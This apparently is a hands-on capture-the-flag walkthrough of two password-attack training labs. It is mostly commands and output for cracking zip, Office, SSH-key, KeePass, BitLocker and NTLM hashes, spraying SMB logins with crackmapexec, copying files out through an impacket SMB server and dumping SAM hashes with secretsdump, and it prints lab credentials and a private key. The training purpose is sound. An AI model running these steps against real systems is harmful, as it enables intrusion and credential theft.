bash updater.bash 
vim updater.bash
apt-cache search gem
sudo gem install -V lolcat
sudo apt-get install fortune
analysis.py -u root -p dgb6fzm0ynk@AME9pqu
rm -rf analysis.py
fortune 
man fortune 
fortune -o
man fortune 
```



### Password Attacks Lab - Medium

45. Examine the second target and submit the contents of flag.txt in /root/ as the answer. 

Again we start with nmap
```c
nmap -A 10.129.118.203 -Pn -oN mediumlabnmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 11:37 +05
Nmap scan report for 10.129.118.203
Host is up (0.62s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: SKILLS-MEDIUM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-10-22T06:39:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.77 seconds

```

We see ssh, smb, open ports so we can probably try to work with smb first
```c
mbclient -N -L \\\\10.129.118.203                                                                     

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        SHAREDRIVE      Disk      SHARE-DRIVE
        IPC$            IPC       IPC Service (skills-medium server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.129.118.203 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

```

We can enumerate the SHAREDRIVE to look what is inside of it
```c
smbclient \\\\10.129.118.203\\SHAREDRIVE    
Password for [WORKGROUP\r3so1v3]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 10 15:39:38 2022
  ..                                  D        0  Thu Feb 10 15:35:54 2022
  Docs.zip                            N     6724  Thu Feb 10 15:39:38 2022

                14384136 blocks of size 1024. 10222664 blocks available
smb: \> get Docs.zip
getting file \Docs.zip of size 6724 as Docs.zip (4.7 KiloBytes/sec) (average 4.7 KiloBytes/sec)
smb: \> ls

```

We see some file Docs.zip which I downloaded and it is encrypted , I crack it  using mutated password list from the resources 
```c
ls
Docs.zip  mediumlabnmap  mutated-passwords  password.list  username.list                                                

zip2john Docs.zip > zip.hash
ver 2.0 efh 5455 efh 7875 Docs.zip/Documentation.docx PKZIP Encr: TS_chk, cmplen=6522, decmplen=9216, crc=B1855553 ts=597A cs=597a type=8

john --wordlist=mutated-passwords zip.hash                                        
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Destiny2022!     (Docs.zip/Documentation.docx)     
1g 0:00:00:00 DONE (2024-10-22 11:41) 100.0g/s 2457Kp/s 2457Kc/s 2457KC/s Ch0c0l@te6!..Fuckyou81
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We got now the password `Destiny2022!` So we unzip it with this password and get the new .docx file
```c
unzip Docs.zip                                    
Archive:  Docs.zip
[Docs.zip] Documentation.docx password: 
  inflating: Documentation.docx      
ls
Docs.zip  Documentation.docx  mediumlabnmap  mutated-passwords  password.list  username.list  zip.hash                                           
python3 /usr/share/john/office2john.py Documentation.docx > docs.hash

john --wordlist=mutated-passwords docs.hash
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 512/512 AVX512BW 16x / SHA512 512/512 AVX512BW 8x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
987654321        (Documentation.docx)     
1g 0:00:00:00 DONE (2024-10-22 11:43) 2.040g/s 7314p/s 7314c/s 7314C/s 9876542001!..98765432109
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now we also got the password for that Documentation.docx file `987654321`, which we can open now.
Inside of this document I found creds for user
```c
dennis:7AUgWWQEiMPdqx
```

So I decided to ssh with that creds
```c
ssh jason@10.129.118.203
jason@10.129.118.203's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)
jason@skills-medium:~$ ls -la
total 28
drwxr-xr-x 4 jason jason 4096 Mar 25  2022 .
drwxr-xr-x 4 root  root  4096 Feb 10  2022 ..
-rw-r--r-- 1 jason jason  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 jason jason 3771 Feb 25  2020 .bashrc
drwx------ 2 jason jason 4096 Mar 25  2022 .cache
drwx------ 3 jason jason 4096 Mar 25  2022 .config
-rw-r--r-- 1 jason jason  807 Feb 25  2020 .profile
jason@skills-medium:~$ cd /root
-bash: cd: /root: Permission denied
jason@skills-medium:~$ sudo -l
[sudo] password for jason: 
Sorry, user jason may not run sudo on skills-medium.
jason@skills-medium:~$ pwd 
/home/jason

```

We see that we can not use sudo and see it's permissions. Nevertheless we can look for open ports inside the target system using netstat command
```c
jason@skills-medium:~$ netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
^C
jason@skills-medium:~$ netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0     72 10.129.118.203:22       10.10.16.40:47092       ESTABLISHED -                   
tcp        0      1 10.129.118.203:46682    1.1.1.1:53              SYN_SENT    -                   
tcp        0      0 10.129.118.203:445      10.10.16.40:35498       ESTABLISHED -                   

```

As you can see the ip 127.0.0.1:3306 is mysql, we can try to log in with jason's creds to it and enumerate this service. Eventually we found another user and his password
```
dennis:7AUgWWQEiMPdqx
```

```c
jason@skills-medium:~$ mysql -u jason -pC4mNKjAtL2dydsYa6 -h 127.0.0.1
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> ls
    -> ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ls' at line 1
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| users              |
+--------------------+
2 rows in set (0.01 sec)

mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| creds           |
+-----------------+
1 row in set (0.01 sec)

mysql> select * from creds
    -> ;
+-----+--------------------+----------------+
| id  | name               | password       |
+-----+--------------------+----------------+
|   1 | Hiroko Monroe      | YJE25AGN4CX    |
|   2 | Shelley Levy       | GOK34QLM1DT    |
    SNIP
| 100 | Lael Rivers        | YNQ63NWP1RD    |
| 101 | dennis             | 7AUgWWQEiMPdqx |
+-----+--------------------+----------------+
101 rows in set (0.00 sec)

mysql> exit
Bye

```

As we now know new user, we can log in as dennis
```c
jason@skills-medium:~$ su dennis
Password: 
dennis@skills-medium:/home/jason$ ls -la
total 32
drwxr-xr-x 4 jason jason 4096 Oct 22 07:01 .
drwxr-xr-x 4 root  root  4096 Feb 10  2022 ..
-rw-r--r-- 1 jason jason  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 jason jason 3771 Feb 25  2020 .bashrc
drwx------ 2 jason jason 4096 Mar 25  2022 .cache
drwx------ 3 jason jason 4096 Mar 25  2022 .config
-rw------- 1 jason jason  103 Oct 22 07:01 .mysql_history
-rw-r--r-- 1 jason jason  807 Feb 25  2020 .profile
```

We can try to go to .ssh directory to get the id_rsa file
```c
dennis@skills-medium:/home/jason$ cd ~
dennis@skills-medium:~$ cd .ssh
dennis@skills-medium:~/.ssh$ ls -la
total 20
drwx------ 2 dennis dennis 4096 Feb 10  2022 .
drwxr-xr-x 5 dennis dennis 4096 Mar 25  2022 ..
-rw-rw-r-- 1 dennis dennis  553 Feb 10  2022 authorized_keys
-rw------- 1 dennis dennis 2546 Feb 10  2022 id_rsa
-rw-r--r-- 1 dennis dennis  574 Feb 10  2022 id_rsa.pub
dennis@skills-medium:~/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,735C4BC00394A787F6FCE95C5B7F2331

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
-----END RSA PRIVATE KEY-----

```

I simply copied it and pasted inside my attack machine. But later on we need to crack it
```c
nano id_rsa

Paste the above id_rsa here
```

Now we can use john to crack the hash and use id_rsa for sshing to the target. We need to change permissions twice to be able to crack it first, and then to be able to use it as id_rsa
```c
chmod 777 id_rsa 

python2.7 /usr/share/john/ssh2john.py id_rsa > ssh.hash

john --wordlist=mutated-passwords ssh.hash  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd12020!   (id_rsa)     
1g 0:00:00:00 DONE (2024-10-22 12:04) 50.00g/s 1982Kp/s 1982Kc/s 1982KC/s P@ssw0rd12015!..P@ssw0rd181
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

So there is a passphrase for id_rsa, which we will use now, but first change the permission
```c
chmod 600 id_rsa
```

Now we can finally ssh as root to the system and get the flag.txt!
```c
ssh root@10.129.118.203 -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)
Last login: Fri Mar 25 15:41:38 2022 from 10.129.202.106
root@skills-medium:~# ls -la
total 64
drwx------  7 root root 4096 Feb 10  2022 .
drwxr-xr-x 19 root root 4096 Feb  9  2022 ..
-rw-------  1 root root 3277 Mar 25  2022 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Feb  9  2022 .cache
drwx------  3 root root 4096 Feb  9  2022 .config
-rw-r--r--  1 root root   32 Feb 10  2022 flag.txt
-rw-------  1 root root   52 Feb  9  2022 .lesshst
drwxr-xr-x  3 root root 4096 Dec 15  2020 .local
-rw-------  1 root root  932 Feb 10  2022 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwxr-xr-x  3 root root 4096 Dec 15  2020 snap
drwx------  2 root root 4096 Mar 25  2022 .ssh
-rw-------  1 root root 6083 Feb 10  2022 .viminfo
-rw-r--r--  1 root root  215 Feb  9  2022 .wget-hsts
root@skills-medium:~# cat flag.txt 
HTB{PeopleReuse_PWsEverywhere!}
```


### Password Attacks Lab - Hard

46. Examine the third target and submit the contents of flag.txt in C:\Users\Administrator\Desktop\ as the answer. 

As always, the first thing that we do, is to do nmap scan
```c
nmap 10.129.200.172 -Pn -A
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WINSRV
| Not valid before: 2024-10-22T04:06:56
|_Not valid after:  2025-04-23T04:06:56
|_ssl-date: 2024-10-23T04:13:03+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINSRV
|   NetBIOS_Domain_Name: WINSRV
|   NetBIOS_Computer_Name: WINSRV
|   DNS_Domain_Name: WINSRV
|   DNS_Computer_Name: WINSRV
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-23T04:12:55+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

From the nmap scan, we can see many open ports: smb, rdp, rpc
As written in the lab description, there was found user `johanna`, so we can use our mutated password list to brute force smb and rdp, using crackmapexec. 
```c
crackmapexec smb 10.129.154.118 -u Johanna -p mutated-passwords.list

SMB         10.129.154.118  445    WINSRV           [-] WINSRV\Johanna:1231232017 STATUS_LOGON_FAILURE 
SMB         10.129.154.118  445    WINSRV           [-] WINSRV\Johanna:1231232017! STATUS_LOGON_FAILURE 
SMB         10.129.154.118  445    WINSRV           [-] WINSRV\Johanna:1231232018 STATUS_LOGON_FAILURE 
.
.
.
SNIP
.
.
.
SMB         10.129.154.118  445    WINSRV           [+] WINSRV\Johanna:1231234! 
```

As we can see from the results of brute force of smb, we found the password for johanna which is `1231234!` However this password was correct for RDP session which was kind of weird. Btw, I spent almost 3 hours of stupid bruteforcing, with hydra and crowbar and got many false-positives from hydra, so I strongly recommend using crackmapexec (CME) for this task, which also will take you around 1 hour with mutated password list using custom rule from the resources button in the module.
So now we can RDP to target system via xfreerdp
```c
xfreerdp /v:10.129.154.118 /u:johanna
```

Then we can see that there is a file called `Logins.kdbx` in the Documents folder, which is locked with password and which we need to transfer to out attack machine
![](https://i.imgur.com/g8TYPeA.png)

I have been trying many methods to upload the file to my attack machine: scp, curl, impacket and so on, but smb server with credentials worked eventually
```c
sudo impacket-smbserver share -smb2support /home/mrbnf/Documents/ -user test -password test   # On the attack machine

net use n: \\10.10.16.15\share /user:test test  # In the C:\Users\johanna\documents directory of target machine
copy n:\ Logins.kdbx 
```

After that I copied and pasted the file manually in the rdp session to my share
```c
sudo impacket-smbserver share -smb2support /home/r3so1v3/Documents/ -user test -password test 
```

![](https://i.imgur.com/nbs5lxt.png)

I got the file in my attack machine, so I was trying to crack it
```c
keepass2john Logins.kdbx > hash.txt  
john --wordlist=mut_password.list hash.txt
```

After that I got the password of the file `Qwerty7!`
Next I opened the .kdbx file using password above
I found a password of `david` but I could not use rdp with this username, and his password so I opened cmd as david in RDP session of johannas
```c
runas /user:david cmd.exe
```

![](https://i.imgur.com/pM1za4m.png)

When I tried to go to david's home directory I got .vhd partition , it was encrypted by bitlocker

![](https://i.imgur.com/bIGnEf9.png)

However it is very large so I could not copy it to my attack machine.
For this I looked for the smb share if it was accessible , so I can mount it.

```c
smbclient -U david -L \\\\10.129.154.118
smbclient -U david \\\\10.129.154.118\\david
```

I can mount the share david
```c
sudo mkdir -p /mnt/smb_share  
sudo mount -t cifs //10.129.154.118/david /mnt/smb_share -o username=david,password=gRzX7YbeTcDG7
```

After that I got the share in my attack machine
Here I tied to extract the hash from .vhd to crack it
```c
sudo bitlocker2john -i Backup.vhd > /home/r3so1v3/backup.hashes
```

Then I tried to crack it
```c
grep "bitlocker\$0" backup.hashes > backup.hash  
cat backup.hash  
hashcat -m 22100 backup.hash mut_password.list -o backup.cracked  
cat backup.cracked
```

 After running the above commands I found the password. So I wanted to read the content of .vhd file/partition.
This took me a very long time, after making the research I found how to mount .vhd
.vhd is in the path `/r3so1v3/smb_share/backup.vhd`
```c
sudo mkdir /media/backup_bitlocker /media/mount  
sudo losetup -P /dev/loop100 /mnt/smb_share/backup.vhd  
sudo dislocker -v -V /dev/loop100p2 -u -- /media/backup_bitlocker  
sudo mount -o loop,rw /media/backup_bitlocker/dislocker-file /media/mount  
ls -la /media/mount
```

Also I noticed that it contained the SAM and SYSTEM local database, so I extracted the hashes from it
```c
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
```

After running the above command I got the NTLM hash of administrator, which I copied to administrator.hash to crack it
```c
sudo hashcat -m 1000 administrator.hash /home/r3so1v3/Hacking/academy/password-attacks/hardlab/mutated-password.list
```

After that I got the password of administrator which I then used to open rdp session as administrator , and read the flag
```c
xfreerdp /v:10.129.154.118 /u:administrator
```

![](https://i.imgur.com/dfncMKj.png)
